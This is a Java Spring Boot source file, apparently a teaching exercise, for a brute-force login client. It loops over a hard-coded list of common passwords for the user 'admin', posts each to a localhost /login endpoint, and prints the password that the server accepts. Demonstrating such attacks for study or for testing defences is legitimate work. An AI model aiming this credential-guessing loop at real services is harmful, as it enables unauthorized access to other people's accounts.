package systementor.bruteforceclientapp;

import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.http.HttpStatusCode;
import org.springframework.web.client.RestClient;
import org.springframework.web.client.RestClientResponseException;

@SpringBootApplication
public class BruteforceClientAppApplication implements CommandLineRunner {
    private final RestClient restClient = RestClient.create();

    public static void main(String[] args) {
        SpringApplication.run(BruteforceClientAppApplication.class, args);
    }

    @Override
    public void run(String... args) throws Exception {
        String username = "admin";

        String [] passwords =
                {
                "12345",
                "password",
                "wrongpassword",
                "test1234",
                "secret",
                "secret123",
                "aftercorrect"
                };

                for (String password : passwords) {
                    LoginRequest loginRequest = new LoginRequest(username, password);

                    try {
                        String response = restClient.post()
                                .uri("http://localhost:8080/login")
                                .body(loginRequest)
                                .retrieve()
                                .body(String.class);

                        System.out.println("Testing password: " + password + " | status: 200");
                        System.out.println("Correct password: " + password);
                        System.out.println("Response from server: " + response);
                        break;
                    } catch (RestClientResponseException e){
                        HttpStatusCode statusCode = e.getStatusCode();
                        System.out.println("Testing password: " + password + " " + statusCode.value());
                    }


                }



    }

}
